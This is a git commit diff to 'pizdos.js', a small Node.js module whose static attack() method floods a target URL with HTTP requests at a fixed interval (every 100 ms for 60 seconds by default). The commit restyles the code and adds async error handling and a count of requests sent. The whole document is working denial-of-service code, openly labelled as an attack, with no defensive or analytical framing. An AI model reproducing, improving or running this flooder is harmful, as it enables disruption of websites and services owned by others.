761db802d2c17dbe4c9f19e41447fd9434bb0e4c
flurescein <flurescein@gmail.com>
2018-11-13 02:34:05 +0300

    Modify code style slightly and rewrote error handling using async.

--- src/pizdos.js
+++ src/pizdos.js
@@ -1,29 +1,36 @@
 const r2 = require('r2')
 
 module.exports = class Pizdos {
-    /**
-     * Starts attack on url using options.
-     * @param {string} url 
-     * @param {object} options
-     * @returns {void}
-     * @public
-     */
-    static attack(url, {
-        duration = 60000,
-        frequency = 100,
-        log = console.log
-    } = {}) {
-        log(`Attack started at ${new Date}.`)
+  /**
+   * Starts attack on url using options.
+   * @param {string} url 
+   * @param {object} options
+   * @returns {void}
+   * @public
+   */
+  static attack(url, {
+    duration = 60000,
+    frequency = 100,
+    log = console.log
+  } = {}) {
+    let requestsCount = 0
 
-        setInterval(() =>
-            r2(url).text
-            .catch(error => {
-                throw 'Attack ended with an error.\n' + error
-            }), frequency)
+    log(`Attack started at ${new Date}.`)
 
-        setTimeout(() => {
-            log(`Attack complete at ${new Date}.`)
-            process.exit(0)
-        }, duration)
-    }
+    const intervalId = setInterval(async () => {
+      try {
+        await r2(url).text
+      } catch (err) {
+        clearInterval(intervalId)
+        throw `Attack ended with an error.\n${err}`
+      } finally {
+        requestsCount++
+      }
+    }, frequency)
+
+    setTimeout(() => {
+      log(`Attack complete at ${new Date}. ${requestsCount} requests were sent.`)
+      clearInterval(intervalId)
+    }, duration)
+  }
 }
